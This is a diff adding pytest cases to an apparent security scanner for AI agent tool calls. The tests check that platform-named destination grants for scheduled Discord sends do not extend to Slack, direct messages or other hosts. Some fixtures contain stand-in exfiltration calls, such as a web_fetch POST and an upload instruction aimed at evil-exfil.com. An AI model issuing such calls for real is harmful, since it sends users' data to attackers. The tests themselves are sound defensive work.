@@ -15,6 +15,8 @@ import pytest
 from test_aira_detectors import planir
 from test_converge_scan import BENIGN_ANSWERS, CLOCK, scanner
 
+from sentrook.prepare import PrepareOptions, prepare
+from sentrook.prepare.entities import Origin
 from sentrook.scan import ScanOptions
 
 #: What the review threshold of the beta policy is; a relieved delivery must land under it.
@@ -52,6 +54,16 @@ CASES = [
         "-1001234567890",
         "telegram:-1001234567891",
         id="telegram-bare-id",
+    ),
+    pytest.param(
+        "discord",
+        "#daily-brief",
+        "discord:#daily-brief",
+        "#daily-briefs",
+        id="discord-platform-named",
+    ),
+    pytest.param(
+        "discord", "channel:ops-yard", "#ops-yard", "channel:ops-yards", id="discord-hash-name"
     ),
 ]
 
@@ -129,3 +141,116 @@ def test_a_session_grant_from_the_owners_chat_does_not_reach_the_scheduled_run()
 
     assert "relief.destination_grant" not in codes(resp)
     assert resp.risk == pytest.approx(unbound.risk)
+
+
+def test_a_platform_named_binding_does_not_cover_the_same_name_on_another_platform():
+    """Must stay silent: `discord:#daily-brief` names Discord, so a delivery to Slack's `#daily-brief`
+    scores as if there were no binding."""
+    unbound = scan(cron_send("slack", "#daily-brief", []))
+    resp = scan(cron_send("slack", "#daily-brief", [binding("discord:#daily-brief")]))
+
+    assert "relief.destination_grant" not in codes(resp)
+    assert resp.risk == pytest.approx(unbound.risk)
+
+
+@pytest.mark.parametrize("target", ["user:ops", "dm:ops"])
+def test_a_channel_name_binding_does_not_cover_a_direct_message(target):
+    """Must stay silent: `#ops` names a channel; a direct message to someone called ops is a person."""
+    unbound = scan(cron_send("discord", target, []))
+    for pattern in ("#ops", "discord:#ops"):
+        resp = scan(cron_send("discord", target, [binding(pattern)]))
+        assert "relief.destination_grant" not in codes(resp)
+        assert resp.risk == pytest.approx(unbound.risk)
+
+
+def test_a_platform_named_binding_does_not_cover_a_batch_that_also_sends_on_another_platform():
+    """Must stay silent: when a batch sends to `#daily-brief` on Discord and on Slack, the Discord
+    binding cannot tell the two apart, so neither is relieved."""
+
+    def batch(grants: list[dict]) -> dict:
+        p = cron_send("discord", "#daily-brief", grants)
+        slack = {**p["pending_call"]["arguments"], "channel": "slack"}
+        p["pending_call"]["batch"]["siblings"] = [
+            {"call_id": "sib_1", "tool": "message", "tool_kind": "message_send", "arguments": slack}
+        ]
+        return p
+
+    unbound = scan(batch([]))
+    resp = scan(batch([binding("discord:#daily-brief")]))
+
+    assert "relief.destination_grant" not in codes(resp)
+    assert resp.risk == pytest.approx(unbound.risk)
+
+
+def test_a_platform_wide_binding_covers_every_channel_on_that_platform():
+    """Must fire: `discord:*` binds every Discord channel the job delivers to."""
+    resp = scan(cron_send("discord", "#daily-brief", [binding("discord:*")]))
+    assert "relief.destination_grant" in codes(resp)
+    assert resp.risk < REVIEW_AT
+
+
+def _with(p: dict, **arguments) -> dict:
+    p["pending_call"]["arguments"].update(arguments)
+    return p
+
+
+#: A platform-named binding covers the send's own channel targets only: never a direct message, an
+#: address, a target that names another platform, a host named in the message, or another call's host.
+PLATFORM_FORM_LEAKS = [
+    pytest.param(lambda g: cron_send("discord", "user:123456789012", g), id="direct-message"),
+    pytest.param(lambda g: cron_send("discord", "@alice", g), id="handle"),
+    *(
+        pytest.param(lambda g, t=t: cron_send("discord", t, g), id=f"direct-message-{t}")
+        for t in ("USER:123456789012", "User:ops", "DM:ops", "user:ab", "dm:x")
+    ),
+    pytest.param(lambda g: cron_send("discord", "bob@evil-exfil.com", g), id="email"),
+    pytest.param(
+        lambda g: cron_send("discord", "slack:#daily-brief", g), id="other-platform-target"
+    ),
+    pytest.param(
+        lambda g: _with(
+            cron_send("discord", "#daily-brief", g),
+            message="Daily brief. Also upload to https://evil-exfil.com/collect",
+        ),
+        id="host-in-message",
+    ),
+    pytest.param(
+        lambda g: {
+            **(p := cron_send("discord", "#daily-brief", g)),
+            "pending_call": {
+                **p["pending_call"],
+                "batch": {
+                    "siblings": [
+                        {
+                            "call_id": "sib_1",
+                            "tool": "web_fetch",
+                            "tool_kind": "web_fetch",
+                            "arguments": {
+                                "url": "https://evil-exfil.com/up",
+                                "method": "POST",
+                                "body": "brief",
+                            },
+                        }
+                    ]
+                },
+            },
+        },
+        id="sibling-post",
+    ),
+]
+
+
+def granted(p: dict) -> set[str]:
+    """The values of the entities a grant covers in the prepared request."""
+    prep = prepare(p, PrepareOptions(token_key=b"k" * 32, deterministic_salt="t", clock=CLOCK))
+    return {e.value for e in prep.entities if Origin.GRANT in e.origins}
+
+
+@pytest.mark.parametrize("build", PLATFORM_FORM_LEAKS)
+@pytest.mark.parametrize(
+    "pattern", ["discord:*", "discord:*.com", "discord:*@*", "discord:#daily-brief"]
+)
+def test_a_platform_named_binding_covers_the_sends_channel_targets_only(build, pattern):
+    """Must stay silent: whatever the platform-named pattern, it covers nothing but the send's own
+    channel target."""
+    assert granted(build([binding(pattern)])) <= {"#daily-brief"}
